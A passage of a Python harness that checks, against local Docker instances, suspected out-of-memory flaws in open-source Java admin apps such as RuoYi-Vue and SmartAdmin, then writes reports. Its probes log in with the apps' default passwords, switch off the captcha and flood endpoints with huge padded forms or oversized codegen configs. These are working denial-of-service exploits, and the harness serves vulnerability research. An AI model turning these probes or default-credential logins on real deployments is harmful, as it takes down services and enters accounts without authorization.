                    if status >= 500 and b"OutOfMemoryError" in body:
                        return
                except (urllib.error.URLError, TimeoutError, OSError) as exc:
                    with lock:
                        last_exception = repr(exc)
                    return
                if index % 200 == 0:
                    time.sleep(0.005)

        threads = [threading.Thread(target=worker, args=(worker_id,), daemon=True) for worker_id in range(12)]
        for thread in threads:
            thread.start()
        deadline = time.monotonic() + 300
        while time.monotonic() < deadline:
            if process.poll() is not None or oom_signal(log_path):
                break
            if all(not thread.is_alive() for thread in threads):
                break
            time.sleep(0.5)
        for thread in threads:
            thread.join(timeout=2)
        return finish_probe(
            case,
            process,
            handle,
            log_path,
            sent,
            {
                "heap": heap,
                "port": port,
                "endpoint": endpoint,
                "mysqlContainer": mysql_name,
                "mysqlImage": mysql_image,
                "mysqlPort": mysql_port,
                "loginStatus": login_status,
                "loginBodyPrefix": login_body,
                "workerThreads": len(threads),
                "lastHttpStatus": last_status,
                "lastBodyPrefix": last_body,
                "clientException": last_exception,
                "postProbePortOpen": port_open(port),
            },
            notes=notes,
        )
    finally:
        if process is not None and handle is not None and process.poll() is None:
            stop_process(process, handle)
        docker_rm(mysql_name)


def run_dcmp_demo_operate(case: Candidate) -> ProbeResult:
    pad = "D" * 24576

    def form(index: int) -> dict[str, object]:
        return {
            "userCode": f"P0{index:08d}",
            "userName": f"p0-demo-{index}-{pad}",
            "userSex": "0",
            "userPhone": f"139{index % 100000000:08d}",
            "userEmail": f"p0-{index}@example.test",
            "userBalance": "1.0",
            "status": "0",
        }

    return run_dcmp_static_map(case, "/demo/operate/add", form, "默认 Shiro 登录后访问 demo static map 写入路径。")


def run_dcmp_test_user_save(case: Candidate) -> ProbeResult:
    pad = "T" * 32768

    def form(index: int) -> dict[str, object]:
        return {
            "userId": 100000000 + index,
            "username": f"p0-test-{index}-{pad}",
            "password": pad,
            "mobile": f"138{index % 100000000:08d}",
        }

    return run_dcmp_static_map(case, "/test/user/save", form, "默认 Shiro 登录后访问 Swagger test static map 写入路径。")


def ryvf_login(port: int) -> tuple[str, int, str]:
    status, body, _ = json_request(
        f"http://127.0.0.1:{port}/login",
        {"username": "admin", "password": "admin123", "code": "", "uuid": ""},
        headers={"User-Agent": "Mozilla/5.0"},
    )
    return json_token(body), status, body.decode("utf-8", errors="replace")[:500]


def run_ryvf_test_user_save(case: Candidate) -> ProbeResult:
    port = 18087
    mysql_port = 33310
    redis_port = 36379
    mysql_name = "p0-ryvf-mysql"
    redis_name = "p0-ryvf-redis"
    heap = "384m"
    mysql_image = ""
    redis_image = ""
    process: subprocess.Popen[bytes] | None = None
    handle: object | None = None
    log_path = LOG_DIR / f"{case.candidate_id}.log"
    try:
        mysql_image = start_mysql_container(mysql_name, mysql_port, "password", mysql_version="5.7")
        mysql_import(mysql_name, "password", "ry-vue", RYVF_DIR / "sql" / "ry_20260417.sql")
        mysql_import(mysql_name, "password", "ry-vue", RYVF_DIR / "sql" / "quartz.sql")
        mysql_exec(
            mysql_name,
            "password",
            "USE `ry-vue`; UPDATE sys_config SET config_value='false' WHERE config_key='sys.account.captchaEnabled';\n",
        )
        redis_image = start_redis_container(redis_name, redis_port)
        process, handle, log_path = start_ryvf(case, heap, port, mysql_port, redis_port)
        token, login_status, login_body = ryvf_login(port)
        time.sleep(3)
        baseline_oom = oom_signal(log_path)
        if baseline_oom:
            return manual_probe_result(
                case,
                process,
                handle,
                log_path,
                0,
                {
                    "heap": heap,
                    "port": port,
                    "endpoint": "/test/user/save",
                    "mysqlContainer": mysql_name,
                    "mysqlImage": mysql_image,
                    "mysqlPort": mysql_port,
                    "redisContainer": redis_name,
                    "redisImage": redis_image,
                    "redisPort": redis_port,
                    "loginStatus": login_status,
                    "loginBodyPrefix": login_body,
                    "tokenAcquired": bool(token),
                    "runtimeDbChange": "sys.account.captchaEnabled=false to exercise authenticated low-privilege P0 path",
                    "runtimeLogbackConfig": rel(RUNTIME_DIR / "ryvf-logback.xml"),
                    "baselineOomBeforeTargetRequests": baseline_oom,
                },
                "pre_target_oom",
                "not_confirmed",
                False,
                notes="登录预热阶段已出现 OOM，未把该 OOM 归因到 /test/user/save static map。",
            )
        sent = 0
        last_status = 0
        last_body = ""
        last_exception = ""
        pad = "R" * 262144
        lock = threading.Lock()
        next_index = 0
        headers = {"Authorization": f"Bearer {token}"} if token else {}

        def worker(worker_id: int) -> None:
            nonlocal sent, last_status, last_body, last_exception, next_index
            while True:
                with lock:
                    next_index += 1
                    index = next_index
                if index > 160000 or process is None or process.poll() is not None or oom_signal(log_path):
                    return
                try:
                    data = urllib.parse.urlencode(
                        {
                            "userId": 100000000 + index,
                            "username": f"p0-ryvf-{index}-{pad}",
                            "password": pad,
                            "mobile": f"137{index % 100000000:08d}",
                        }
                    ).encode("utf-8")
                    status, body, _ = http_request(
                        f"http://127.0.0.1:{port}/test/user/save",
                        method="POST",
                        data=data,
                        headers={"Content-Type": "application/x-www-form-urlencoded", **headers},
                        timeout=12,
                    )
                    with lock:
                        sent += 1
                        last_status = status
                        if index % 1000 == 0:
                            last_body = body.decode("utf-8", errors="replace")[:500]
                    if status >= 500 and b"OutOfMemoryError" in body:
                        return
                except (urllib.error.URLError, TimeoutError, OSError) as exc:
                    with lock:
                        last_exception = repr(exc)
                    return
                if index % 200 == 0:
                    time.sleep(0.005)

        threads = [threading.Thread(target=worker, args=(worker_id,), daemon=True) for worker_id in range(12)]
        for thread in threads:
            thread.start()
        deadline = time.monotonic() + 300
        while time.monotonic() < deadline:
            if process.poll() is not None or oom_signal(log_path):
                break
            if all(not thread.is_alive() for thread in threads):
                break
            time.sleep(0.5)
        for thread in threads:
            thread.join(timeout=2)
        return finish_probe(
            case,
            process,
            handle,
            log_path,
            sent,
            {
                "heap": heap,
                "port": port,
                "endpoint": "/test/user/save",
                "mysqlContainer": mysql_name,
                "mysqlImage": mysql_image,
                "mysqlPort": mysql_port,
                "redisContainer": redis_name,
                "redisImage": redis_image,
                "redisPort": redis_port,
                "loginStatus": login_status,
                "loginBodyPrefix": login_body,
                "tokenAcquired": bool(token),
                "runtimeDbChange": "sys.account.captchaEnabled=false to exercise authenticated low-privilege P0 path",
                "runtimeLogbackConfig": rel(RUNTIME_DIR / "ryvf-logback.xml"),
                "workerThreads": len(threads),
                "lastHttpStatus": last_status,
                "lastBodyPrefix": last_body,
                "clientException": last_exception,
                "postProbePortOpen": port_open(port),
            },
            notes="默认数据库初始化后关闭默认验证码配置项，以稳定进入低权限登录态；目标 sink 为 /test/user/save static map。",
        )
    finally:
        if process is not None and handle is not None and process.poll() is None:
            stop_process(process, handle)
        docker_rm(mysql_name)
        docker_rm(redis_name)


def smartadmin_login(port: int) -> tuple[str, int, str, int, str]:
    captcha_status, captcha_body, _ = http_request(f"http://127.0.0.1:{port}/login/getCaptcha", timeout=10)
    captcha = parse_json_body(captcha_body)
    data = captcha.get("data") if isinstance(captcha.get("data"), dict) else {}
    captcha_uuid = data.get("captchaUuid", "") if isinstance(data, dict) else ""
    captcha_text = data.get("captchaText", "") if isinstance(data, dict) else ""
    password = sm4_encrypt_for_smartadmin("1024ok")
    login_status, login_body, _ = json_request(
        f"http://127.0.0.1:{port}/login",
        {
            "loginName": "admin",
            "password": password,
            "loginDevice": 1,
            "captchaCode": captcha_text,
            "captchaUuid": captcha_uuid,
        },
    )
    return json_token(login_body), login_status, login_body.decode("utf-8", errors="replace")[:500], captcha_status, captcha_text


def smartadmin_config_payload(table_name: str, columns: list[dict[str, object]], pad: str) -> dict[str, object]:
    fields: list[dict[str, object]] = []
    insert_fields: list[dict[str, object]] = []
    query_fields: list[dict[str, object]] = []
    table_fields: list[dict[str, object]] = []
    for index, column in enumerate(columns):
        column_name = str(column.get("columnName") or f"col_{index}")
        field_name = "".join(part.title() if offset else part for offset, part in enumerate(column_name.split("_")))
        label = f"{column.get('columnComment') or column_name}-{index}-{pad}"
        primary = bool(column.get("primaryKeyFlag"))
        auto_inc = bool(column.get("autoIncreaseFlag"))
        java_type = "Long" if primary else "String"
        fields.append(
            {
                "columnName": column_name,
                "columnComment": label,
                "label": label,
                "fieldName": field_name,
                "javaType": java_type,
                "jsType": "number" if java_type == "Long" else "string",
                "dict": "",
                "enumName": "",
                "primaryKeyFlag": primary,
                "autoIncreaseFlag": auto_inc,
            }
        )
        insert_fields.append(
            {
                "columnName": column_name,
                "requiredFlag": not bool(column.get("nullableFlag")),
                "insertFlag": not auto_inc,
                "updateFlag": True,
                "frontComponent": "Input",
            }
        )
        if not primary:
            query_fields.append(
                {
                    "label": label,
                    "fieldName": field_name,
                    "queryTypeEnum": "Like",
                    "columnNameList": [column_name],
                    "width": f"{160 + (index % 4) * 40}px",
                }
            )
            table_fields.append(
                {
                    "columnName": column_name,
                    "label": label,
                    "fieldName": field_name,
                    "showFlag": True,
                    "width": 180 + (index % 5) * 40,
                    "ellipsisFlag": False,
                }
            )
    return {
        "tableName": table_name,
        "basic": {
            "moduleName": f"p0Probe{pad[:12]}",
            "javaPackageName": f"net.lab1024.sa.p0.{pad[:48].lower()}",
            "description": f"P0 dynamic validation {pad}",
            "frontAuthor": f"p0-front-{pad}",
            "frontDate": "2026-06-26 00:00:00",
            "backendAuthor": f"p0-backend-{pad}",
            "backendDate": "2026-06-26 00:00:00",
            "copyright": f"p0-copyright-{pad}",
        },
        "fields": fields,
        "insertAndUpdate": {
            "isSupportInsertAndUpdate": True,
            "pageType": "modal",
            "width": "960px",
            "countPerLine": 1,
            "fieldList": insert_fields,
        },
        "deleteInfo": {"isSupportDelete": True, "isPhysicallyDeleted": True, "deleteEnum": "SingleAndBatch"},
        "queryFields": query_fields,
        "tableFields": table_fields,
    }


def json_compact_size(value: object) -> int:
    return len(json.dumps(value, ensure_ascii=False, separators=(",", ":")).encode("utf-8"))


def smartadmin_config_storage_sizes(payload: dict[str, object]) -> dict[str, int]:
    return {
        "basic": json_compact_size(payload.get("basic")),
        "fields": json_compact_size(payload.get("fields")),
        "insert_and_update": json_compact_size(payload.get("insertAndUpdate")),
        "delete_info": json_compact_size(payload.get("deleteInfo")),
        "query_fields": json_compact_size(payload.get("queryFields")),
        "table_fields": json_compact_size(payload.get("tableFields")),
    }


def smartadmin_largest_default_text_payload(table_name: str, columns: list[dict[str, object]]) -> tuple[str, dict[str, object], dict[str, int]]:
    # MySQL TEXT is 65,535 bytes; keep a margin for row encoding and connector behavior.
    text_limit = 60000
    for pad_bytes in range(1800, 63, -64):
        pad = "S" * pad_bytes
        payload = smartadmin_config_payload(table_name, columns, pad)
        sizes = smartadmin_config_storage_sizes(payload)
        if all(size <= text_limit for size in sizes.values()):
            return pad, payload, sizes
    pad = "S" * 64
    payload = smartadmin_config_payload(table_name, columns, pad)
    return pad, payload, smartadmin_config_storage_sizes(payload)


def run_smartadmin_codegen(case: Candidate) -> ProbeResult:
    port = 18088
    mysql_port = 33311
    redis_port = 36380
    mysql_name = "p0-smartadmin-mysql"
    redis_name = "p0-smartadmin-redis"
    heap = "192m"
    mysql_image = ""
    redis_image = ""
    process: subprocess.Popen[bytes] | None = None
    handle: object | None = None
    log_path = LOG_DIR / f"{case.candidate_id}.log"
    try:
        mysql_image = start_mysql_container(mysql_name, mysql_port, "SmartAdmin666", mysql_version="8.0")
        mysql_import_raw(mysql_name, "SmartAdmin666", BASE_DIR / "frameworks" / "applications" / "1024-lab__smart-admin" / "数据库SQL脚本" / "mysql" / "smart_admin_v3.sql")
        redis_image = start_redis_container(redis_name, redis_port)
        process, handle, log_path = start_smartadmin(case, heap, port, mysql_port, redis_port)
        token, login_status, login_body, captcha_status, captcha_text = smartadmin_login(port)
        headers = {"Authorization": f"Bearer {token}"} if token else {}
        table_name = "t_employee"
        status, columns_body, _ = http_request(
            f"http://127.0.0.1:{port}/support/codeGenerator/table/getTableColumns/{table_name}",
            headers=headers,
            timeout=15,
        )
        columns_json = parse_json_body(columns_body)
        columns_data = columns_json.get("data") if isinstance(columns_json.get("data"), list) else []
        columns = [column for column in columns_data if isinstance(column, dict)]
        if not columns:
            columns = [
                {"columnName": "employee_id", "columnComment": "employee id", "primaryKeyFlag": True, "autoIncreaseFlag": True, "nullableFlag": False},
                {"columnName": "login_name", "columnComment": "login name", "primaryKeyFlag": False, "autoIncreaseFlag": False, "nullableFlag": False},
                {"columnName": "actual_name", "columnComment": "actual name", "primaryKeyFlag": False, "autoIncreaseFlag": False, "nullableFlag": True},
            ]
        sent = 0
        last_status = status
        last_body = columns_body.decode("utf-8", errors="replace")[:500]
        client_exception = ""
        pad, update_payload, config_storage_sizes = smartadmin_largest_default_text_payload(table_name, columns)
        update_status = 0
        update_body_prefix = ""
        update_ok = False
        download_attempted = False
        download_success_count = 0
        try:
            status, body, _ = json_request(
                f"http://127.0.0.1:{port}/support/codeGenerator/table/updateConfig",
                update_payload,
                headers=headers,
                timeout=30,
            )
            last_status = status
            last_body = body.decode("utf-8", errors="replace")[:500]
            update_status = status
            update_body_prefix = last_body
            update_json = parse_json_body(body)
            update_ok = status == 200 and update_json.get("ok") is True and update_json.get("code") == 0
            sent += 1
            if update_ok:
                download_attempted = True
                for index in range(1, 501):
                    if process.poll() is not None or oom_signal(log_path):
                        break
                    status, body, _ = http_request(
                        f"http://127.0.0.1:{port}/support/codeGenerator/code/download/{table_name}?p0={index}",
                        headers=headers,
                        timeout=20,
                    )
                    last_status = status
                    sent += 1
                    if status == 200 and body.startswith(b"PK"):
                        download_success_count += 1
                    if index % 5 == 0:
                        last_body = body[:256].decode("utf-8", errors="replace")
                    if status >= 500 and b"OutOfMemoryError" in body:
                        break
        except (urllib.error.URLError, TimeoutError, OSError) as exc:
            client_exception = repr(exc)
        return finish_probe(
            case,
            process,
            handle,
            log_path,
            sent,
            {
                "heap": heap,
                "port": port,
                "mysqlContainer": mysql_name,
                "mysqlImage": mysql_image,
                "mysqlPort": mysql_port,
                "redisContainer": redis_name,
                "redisImage": redis_image,
                "redisPort": redis_port,
                "loginStatus": login_status,
                "loginBodyPrefix": login_body,
                "captchaStatus": captcha_status,
                "captchaTextReturned": bool(captcha_text),
                "tokenAcquired": bool(token),
                "endpoint": "/support/codeGenerator/code/download/t_employee",
                "tableName": table_name,
                "columnsDiscovered": len(columns),
                "configPadBytes": len(pad),
                "configStorageBytes": config_storage_sizes,
                "updateConfigStatus": update_status,
                "updateConfigOk": update_ok,
                "updateConfigBodyPrefix": update_body_prefix,
                "downloadAttempted": download_attempted,
                "downloadSuccessCount": download_success_count,
                "lastHttpStatus": last_status,
                "lastBodyPrefix": last_body,
                "clientException": client_exception,
                "runtimeOption": "spring.profiles.active=dev; smart.job.enabled=false",
                "postProbePortOpen": port_open(port),
            },
            notes="使用默认 SQL、Redis、dev profile 明文验证码与默认 super_password 登录后触发 codegen ZIP 路径。",
        )
    finally:
        if process is not None and handle is not None and process.poll() is None:
            stop_process(process, handle)
        docker_rm(mysql_name)
        docker_rm(redis_name)


RUNNERS: dict[str, Callable[[Candidate], ProbeResult]] = {
    "smartadmin_codegen": run_smartadmin_codegen,
    "dcmp_demo_operate": run_dcmp_demo_operate,
    "dcmp_test_user_save": run_dcmp_test_user_save,
    "smqtt_retain": run_smqtt_retain,
    "smqtt_offline_queue": run_smqtt_offline_queue,
    "smqtt_subscriptions": run_smqtt_subscriptions,
    "powerjob_body_cache": run_powerjob_body_cache,
    "wgcloud_session_growth": run_wgcloud_session_growth,
    "xxl_unique_job_threads": run_xxl_unique_job_threads,
    "xxl_same_job_queue": run_xxl_same_job_queue,
    "wangmarket_captcha_sessions": run_wangmarket_captcha_sessions,
    "citrus_captcha_sessions": run_citrus_captcha_sessions,
    "ryvf_test_user_save": run_ryvf_test_user_save,
}


def blocked_result(case: Candidate) -> ProbeResult:
    return ProbeResult(
        candidate_id=case.candidate_id,
        app=case.app,
        title=case.title,
        status="blocked_environment",
        dynamic_verdict="not_run",
        true_positive=False,
        oom_signal="",
        requests_sent=0,
        heap="",
        log="",
        evidence={"blockedReason": case.blocked_reason},
        notes=case.blocked_reason,
    )


def error_result(case: Candidate, exc: Exception) -> ProbeResult:
    return ProbeResult(
        candidate_id=case.candidate_id,
        app=case.app,
        title=case.title,
        status="probe_error",
        dynamic_verdict="not_confirmed",
        true_positive=False,
        oom_signal="",
        requests_sent=0,
        heap="",
        log="",
        evidence={"exception": repr(exc)},
        notes=str(exc),
    )


def result_to_dict(result: ProbeResult) -> dict[str, object]:
    return dataclasses.asdict(result)


def load_existing_results() -> list[ProbeResult]:
    path = OUT_DIR / "summary.json"
    if not path.exists():
        return []
    rows = json.loads(path.read_text(encoding="utf-8"))
    return [ProbeResult(**row) for row in rows]


def merge_results(existing: list[ProbeResult], updates: list[ProbeResult]) -> list[ProbeResult]:
    by_id = {result.candidate_id: result for result in existing}
    by_id.update({result.candidate_id: result for result in updates})
    ordered: list[ProbeResult] = []
    seen: set[str] = set()
    for case in P0_CANDIDATES:
        result = by_id.get(case.candidate_id)
        if result is not None:
            ordered.append(result)
            seen.add(case.candidate_id)
    for result in existing + updates:
        if result.candidate_id not in seen:
            ordered.append(result)
            seen.add(result.candidate_id)
    return ordered


def write_results(results: list[ProbeResult]) -> None:
    OUT_DIR.mkdir(parents=True, exist_ok=True)
    LOG_DIR.mkdir(parents=True, exist_ok=True)
    RUNTIME_DIR.mkdir(parents=True, exist_ok=True)
    rows = [result_to_dict(result) for result in results]
    (OUT_DIR / "summary.json").write_text(json.dumps(rows, indent=2, ensure_ascii=False) + "\n", encoding="utf-8")
    with (OUT_DIR / "findings.jsonl").open("w", encoding="utf-8") as handle:
        for row in rows:
            handle.write(json.dumps(row, ensure_ascii=False) + "\n")
    with (OUT_DIR / "summary.csv").open("w", encoding="utf-8", newline="") as handle:
        fieldnames = [
            "candidate_id",
            "app",
            "status",
            "dynamic_verdict",
            "true_positive",
            "oom_signal",
            "requests_sent",
            "heap",
            "log",
            "notes",
        ]
        writer = csv.DictWriter(handle, fieldnames=fieldnames)
        writer.writeheader()
        for result in results:
            writer.writerow({field: getattr(result, field) for field in fieldnames})
    (OUT_DIR / "P0_DYNAMIC_VALIDATION_REPORT.md").write_text(render_report(results), encoding="utf-8")


def render_report(results: list[ProbeResult]) -> str:
    verified = [result for result in results if result.true_positive]
    blocked = [result for result in results if result.status == "blocked_environment"]
    not_confirmed = [result for result in results if not result.true_positive and result.status != "blocked_environment"]
    lines = [
        "# P0 应用级动态验证结果",
        "",
        f"- 生成时间：{time.strftime('%Y-%m-%d %H:%M:%S')}",
        "- 输入清单：`results/applications_static_analysis/_static_validation/all_candidates_dynamic_validation.md` 的 P0 候选",
        "- 输出目录：`results/applications_dynamic_validation/p0/`",
        "- 真阳性门槛：必须由真实外部协议/HTTP 请求触发目标 JVM OOM；仅资源增长、超时或环境启动失败不提升为真阳性。",
        "",
        "## 总览",
        "",
        f"- P0 候选总数：{len(results)}",
        f"- 已真实触发 OOM 真阳性：{len(verified)}",
        f"- 已执行但未确认 OOM：{len(not_confirmed)}",
        f"- 环境阻塞未执行：{len(blocked)}",
        "",
        "## 逐项结果",
        "",
        "| candidate | app | status | true_positive | oom_signal | requests | log |",
        "| --- | --- | --- | --- | --- | --- | --- |",
    ]
    for result in results:
        log = f"`{result.log}`" if result.log else ""
        signal = result.oom_signal or ""
        lines.append(
            f"| `{result.candidate_id}` | `{result.app}` | `{result.status}` | "
            f"{str(result.true_positive).lower()} | `{signal}` | {result.requests_sent} | {log} |"
        )
    lines.extend(["", "## 真阳性", ""])
    if verified:
        for result in verified:
            lines.extend(
                [
                    f"### `{result.candidate_id}`",
                    "",
                    f"- 应用：`{result.app}`",
                    f"- 结论：`{result.dynamic_verdict}`",
                    f"- OOM 信号：`{result.oom_signal}`",
                    f"- 请求数：{result.requests_sent}",
                    f"- 堆限制：`{result.heap}`",
                    f"- 原始日志：`{result.log}`",
                    f"- 证据：`{json.dumps(result.evidence, ensure_ascii=False)}`",
                    "",
                ]
            )
    else:
        lines.append("本轮没有候选达到真实 OOM 真阳性门槛。")
        lines.append("")
    if not_confirmed:
        lines.extend(["## 已执行但未确认 OOM", ""])
        for result in not_confirmed:
            lines.extend(
                [
                    f"- `{result.candidate_id}`：`{result.status}`；请求数 {result.requests_sent}；日志 `{result.log}`。",
                ]
            )
        lines.append("")
    if blocked:
        lines.extend(["## 环境阻塞", ""])
        for result in blocked:
            lines.append(f"- `{result.candidate_id}`：{result.notes}")
        lines.append("")
    return "\n".join(lines)


def selected_candidates(case_ids: list[str]) -> list[Candidate]:
    if not case_ids:
        return list(P0_CANDIDATES)
    by_id = {case.candidate_id: case for case in P0_CANDIDATES}
    missing = sorted(set(case_ids) - set(by_id))
    if missing:
        raise ValueError(f"unknown P0 candidate(s): {', '.join(missing)}")
    return [by_id[case_id] for case_id in case_ids]


def run_candidates(candidates: list[Candidate], base_results: list[ProbeResult] | None = None) -> list[ProbeResult]:
    updates: list[ProbeResult] = []
    for case in candidates:
        print(f"== {case.candidate_id} {case.app}")
        if case.runner is None:
            result = blocked_result(case)
        else:
            try:
                result = RUNNERS[case.runner](case)
            except Exception as exc:
                result = error_result(case, exc)
        print(f"{case.candidate_id}: {result.status} {result.oom_signal}")
        updates.append(result)
        if base_results is None:
            write_results(updates)
        else:
            write_results(merge_results(base_results, updates))
    return updates if base_results is None else merge_results(base_results, updates)


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--case", action="append", default=[], help="P0 candidate id to run; defaults to all")
    return parser.parse_args()


def main() -> int:
    args = parse_args()
    OUT_DIR.mkdir(parents=True, exist_ok=True)
    LOG_DIR.mkdir(parents=True, exist_ok=True)
    RUNTIME_DIR.mkdir(parents=True, exist_ok=True)
    try:
        candidates = selected_candidates(args.case)
        base_results = load_existing_results() if args.case else None
        results = run_candidates(candidates, base_results=base_results)
    except Exception as exc:
        print(f"application P0 dynamic validation failed: {exc}", file=sys.stderr)
        return 1
    verified = sum(1 for result in results if result.true_positive)
    print(f"wrote {rel(OUT_DIR / 'summary.json')} verified_oom={verified}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
